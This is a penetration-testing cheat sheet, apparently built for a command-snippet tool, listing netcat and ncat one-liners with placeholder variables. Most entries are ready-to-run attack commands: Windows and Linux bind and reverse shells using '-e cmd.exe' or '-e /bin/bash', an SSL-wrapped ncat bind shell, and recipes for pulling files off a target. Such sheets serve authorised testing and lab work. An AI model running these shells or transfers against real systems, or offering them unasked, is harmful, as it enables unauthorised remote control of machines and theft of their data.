# Netcat

## netcat

### Listener

Set up a Netcat listener for incoming shells or file transfers.

```sh title:"Start Netcat listener"
nc -lvnp $lport
```
<!-- cheat
import lports
-->

### Windows bind shell

Start a Windows bind shell with Netcat on the target.

```cmd title:"Start Windows Netcat bind shell"
nc -lvnp $rport -e cmd.exe
```
<!-- cheat
var rport
-->

### Linux bind shell

Start a Linux bind shell with Netcat on the target.

```sh title:"Start Linux Netcat bind shell"
nc -lvnp $rport -e /bin/bash
```
<!-- cheat
var rport
-->

### Windows reverse shell

Connect a Windows shell back to your listener.

```cmd title:"Windows Netcat reverse shell"
nc -nv $lhost $lport -e cmd.exe
```
<!-- cheat
import lports
import tun_ip
-->

### Linux reverse shell

Connect a Linux shell back to your listener.

```sh title:"Linux Netcat reverse shell"
nc -nv $lhost $lport -e /bin/bash
```
<!-- cheat
import lports
import tun_ip
-->

### Download file via nc

Listen on `$lport` to catch a file pushed from the target. Copies the matching sender command to clipboard. Runs md5sum so you can verify integrity.

```sh title:"Netcat Listen for file from target, paste sender, md5 verify"
echo "nc $rhost_ip $lport < $target_file_name" | xclip -sel clip; nc -lvnp $lport > $downloaded_file_name; md5sum $downloaded_file_name
```
<!-- cheat
import lports
import tun_ip
import files
import domain_ip
var target_file_name
var downloaded_file_name
-->

### Upload file via nc

Push a file to a target listener. Copies the matching listener command to clipboard. Logs md5 first so the receiver can confirm.

```sh title:"Netcat Push file to target listener, paste receiver, md5 first"
echo "nc -lvnp $lport > $receiving_file_name" | xclip -sel clip; md5sum $file; nc $rhost_ip $rport < $file
```
<!-- cheat
import lports
import tun_ip
import files
import domain_ip
var target
var rport
var receiving_file_name
-->

## ncat

### SSL bind shell

Start an SSL-wrapped ncat bind shell and allow only one source IP.

```cmd title:"Netcat Start SSL ncat bind shell with allow-list"
ncat --exec cmd.exe --allow $allowed_ip -vnl $rport --ssl
```
<!-- cheat
var allowed_ip
var rport
-->

### Connect SSL bind shell

Connect to an SSL-wrapped ncat bind shell.

```sh title:"Netcat Connect to SSL ncat bind shell"
ncat -v $rhost_ip $rport --ssl
```
<!-- cheat
var rhost_ip
var rport
-->

### HTTP proxy

Start ncat as a simple HTTP proxy.

```sh title:"Netcat Start ncat HTTP proxy"
ncat --listen --proxy-type http $lport
```
<!-- cheat
var lport
-->
